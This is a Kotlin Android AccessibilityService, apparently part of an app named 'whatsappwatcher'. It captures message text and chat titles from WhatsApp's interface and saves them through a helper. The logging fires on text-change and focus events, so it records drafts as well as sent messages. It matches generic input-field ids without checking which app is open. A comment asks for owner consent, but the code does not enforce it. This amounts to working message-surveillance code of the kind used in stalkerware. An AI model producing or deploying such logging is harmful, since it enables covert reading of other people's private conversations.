package com.firsttool.whatsappwatcher

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import java.io.File

/**
 * AccessibilityService to capture outgoing message text from WhatsApp UI.
 * This is sensitive and should only be enabled with explicit device-owner consent.
 */
class WhatsAppAccessibilityService : AccessibilityService() {
    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        try {
            if (event == null) return

            // Only act on view text changed or view clicked events
            if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED ||
                event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED ||
                event.eventType == AccessibilityEvent.TYPE_VIEW_FOCUSED) {

                val root = rootInActiveWindow ?: return
                // Heuristic: find EditText content and the send button state
                val message = findWhatsAppMessageText(root)
                val chatTitle = findWhatsAppChatTitle(root) ?: "Unknown"

                if (!message.isNullOrBlank()) {
                    saveSentMessage(chatTitle, message)
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    override fun onInterrupt() {}

    private fun findWhatsAppMessageText(root: AccessibilityNodeInfo): String? {
        // WhatsApp typical message input has resource-id containing "entry" or "composer"
        val queue: ArrayDeque<AccessibilityNodeInfo> = ArrayDeque()
        queue.add(root)
        while (queue.isNotEmpty()) {
            val node = queue.removeFirst()
            try {
                val resId = node.viewIdResourceName
                if (resId != null && (resId.contains("entry") || resId.contains("composer") || resId.contains("input"))) {
                    val text = node.text?.toString()
                    if (!text.isNullOrBlank()) return text
                }
            } catch (e: Exception) {
            }
            for (i in 0 until node.childCount) {
                val child = node.getChild(i) ?: continue
                queue.add(child)
            }
        }
        return null
    }

    private fun findWhatsAppChatTitle(root: AccessibilityNodeInfo): String? {
        // Heuristic: chat title often in toolbar with resource-id containing "toolbar" or "title"
        val queue: ArrayDeque<AccessibilityNodeInfo> = ArrayDeque()
        queue.add(root)
        while (queue.isNotEmpty()) {
            val node = queue.removeFirst()
            try {
                val resId = node.viewIdResourceName
                if (resId != null && (resId.contains("title") || resId.contains("toolbar") || resId.contains("action_bar"))) {
                    val text = node.text?.toString()
                    if (!text.isNullOrBlank()) return text
                }
            } catch (e: Exception) {
            }
            for (i in 0 until node.childCount) {
                val child = node.getChild(i) ?: continue
                queue.add(child)
            }
        }
        return null
    }

    private fun saveSentMessage(title: String, message: String) {
        try {
            MediaSaver.saveMessage(applicationContext, title, message, "sent")
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun sanitize(s: String): String {
        return s.replace(Regex("[^A-Za-z0-9_.-]"), "_")
    }
}
